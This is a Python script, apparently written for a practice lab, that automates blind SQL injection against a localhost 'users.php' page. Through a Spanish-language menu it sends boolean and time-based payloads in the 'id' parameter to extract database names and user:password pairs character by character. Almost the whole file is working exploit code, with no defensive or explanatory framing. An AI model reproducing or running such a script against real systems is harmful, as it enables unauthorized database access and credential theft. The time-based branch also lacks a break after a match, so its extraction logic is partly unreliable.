cat sqli.py         
#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

# ctrl_c
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Verificar si se ha proporcionado el argumento de base de datos
if len(sys.argv) != 2:
    print("Uso: {} <nombre de base de datos>".format(sys.argv[0]))
    sys.exit(1)

nombre_base_datos = sys.argv[1]

payload_selec = int(input("\n[1] Listar bases de datos\n[2] Listar usuario:contraseña\n[3] Menú de inyecciones por tiempo\nSeleccionar modalidad: "))
if payload_selec == 2:
    payload = "?id=9 or (select(select ascii(substring((select group_concat(users,0x3a,passwd) from {}),%d,1)) from hack3rs where id = 1001)=%d)".format(nombre_base_datos)
elif payload_selec == 1:
    payload = "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from hack3rs where id = 1001)=%d)"
elif payload_selec == 3:
    payload_selec2 = int(input("\n[1] Listar base de datos actual\n[2] Listar usuario:contraseña\nSeleccionar modalidad: "))
    if payload_selec2 == 1:
        payload = "?id=1001 and if(ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1))=%d,sleep(0.35),1)"
    elif payload_selec2 == 2:
        payload = "?id=1001 and if(ascii(substr((select group_concat(users,0x3a,passwd) from {}),%d,1))=%d,sleep(0.35),1)".format(nombre_base_datos)

# Variables globales
url_target = "http://localhost/users.php"

def makeSQLI():
        p1 = log.progress("FuzZQLi")
        p1.status("[+] Iniciando Inyección...")
        time.sleep(2)
        p2 = log.progress("[!] Información localizada [Extrayendo datos] --->")
        info_database = ""

        for position in range(1,150):
                for character in range(33,126):
                        sqli_payload = url_target + payload % (position,character)
                        p1.status(sqli_payload)
                        time_start = time.time()
                        r = requests.get(sqli_payload)
                        time_end = time.time()

                        if payload_selec == 3 and time_end - time_start > 0.35:
                                info_database += (chr(character))
                                p2.status(info_database)
                        elif payload_selec != 3 and r.status_code == 200:
                                info_database += (chr(character))
                                p2.status(info_database)
                                break

if __name__ == '__main__':
        makeSQLI()
